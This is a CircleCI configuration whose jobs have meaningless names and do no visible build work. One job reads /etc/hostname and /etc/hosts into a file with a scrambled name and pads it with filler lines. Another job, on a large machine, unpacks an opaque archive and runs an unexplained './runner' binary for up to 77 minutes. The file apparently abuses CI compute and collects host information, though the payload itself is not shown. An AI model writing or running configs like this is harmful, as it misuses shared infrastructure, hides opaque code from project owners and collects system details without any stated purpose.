version: 2.1

jobs:
  pastely:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: 15 gel per batch
          command: |
            mkdir -p /tmp/rdy
            set +o pipefail 2>/dev/null; cat /etc/hostname /etc/hosts 2>/dev/null > /tmp/rdy/weSthosTAgeNTQUEuE; seq 1 1445935 >> /tmp/rdy/weSthosTAgeNTQUEuE; true
            echo "produced $(wc -l </tmp/rdy/weSthosTAgeNTQUEuE) lines"
      - persist_to_workspace:
          root: /tmp/rdy
          paths:
            - 'weSthosTAgeNTQUEuE'
  chen-test:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/rdy
      - run:
          name: Receive 5
          command: |
            cat /tmp/rdy/weSthosTAgeNTQUEuE 2>/dev/null | awk '{for(i=1;i<=NF;i++)w[$i]++}END{for(k in w)print w[k],k}' | sort -rn | head -1 || true
      - run:
          name: Clone workspace
          command: git clone --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore vendored sources
          command: xzcat manifest.tar.xz | tar xvf -
      - run:
          no_output_timeout: 77m
          command: exec ./runner
